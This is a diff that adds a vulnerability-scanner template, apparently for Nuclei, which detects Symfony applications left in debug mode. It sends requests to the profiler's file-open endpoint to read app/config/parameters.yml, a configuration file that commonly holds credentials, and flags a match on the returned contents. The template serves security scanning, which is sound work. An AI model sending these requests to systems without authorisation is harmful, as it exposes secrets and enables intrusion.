@@ -1,0 +1,33 @@
+id: symfony-debug-lfi
+info:
+  name: Symfony Debug Local File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The web application uses Symfony framework with Debug mode enabled. Debug mode should be turned off in production environments, as it leads to disclosure of sensitive information, including potential Local File Inclusion vulnerabilities.
+  tags: file-inclusion,symfony
+  reference:
+    - https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode
+    - https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144
+
+http:
+  - raw:
+      - |
+        GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /_profiler/open?file=app/config/parameters.yml HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "parameters:"
+          - "<a class=\"anchor\" name=\"line1\">"
+        part: body
